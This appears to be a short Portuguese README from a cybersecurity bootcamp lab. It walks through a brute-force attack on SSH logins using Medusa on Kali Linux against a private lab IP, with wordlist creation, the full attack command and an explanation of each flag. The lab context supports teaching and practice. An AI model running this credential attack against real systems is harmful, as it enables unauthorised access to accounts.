# Simulador-de-Ataque
Simulação de Ataque com Medusa e Kali Linux.      
Projeto prático desenvolvido durante o Bootcamp Santander Cibersegurança

## 1° - Criar duas listas: uma com usuários e outra com senhas     
nano user.txt    
nano password.txt    
*(digite contra+o depois enter e contra+x para salvar e sair)*

## 2° -Depois digite:
"medusa -h 192.168.56.103 -U user.txt -P password.txt -M ssh -f -O conta.txt"

O que significa:    
```
-h 192.168.56.103 = Ip alvo      
-U user.txt = Informa o nome do arquivo que contém a lista com nomes de usuarios    
-P password.txt = Informa o  nome do arquivo que contém a lista de password    
-M ssh = Informa ao Medusa qual módulo será atacado (SSH)    
-f = Manda o Medusa parar imediatamente assim que encontrar a primeira credencial válida.    
-O conta.txt = Cria um arquivo e salva somente o usuario e senha encontrados    
```
## 3° - Visualizar o resultado encontrado
nano conta.txt
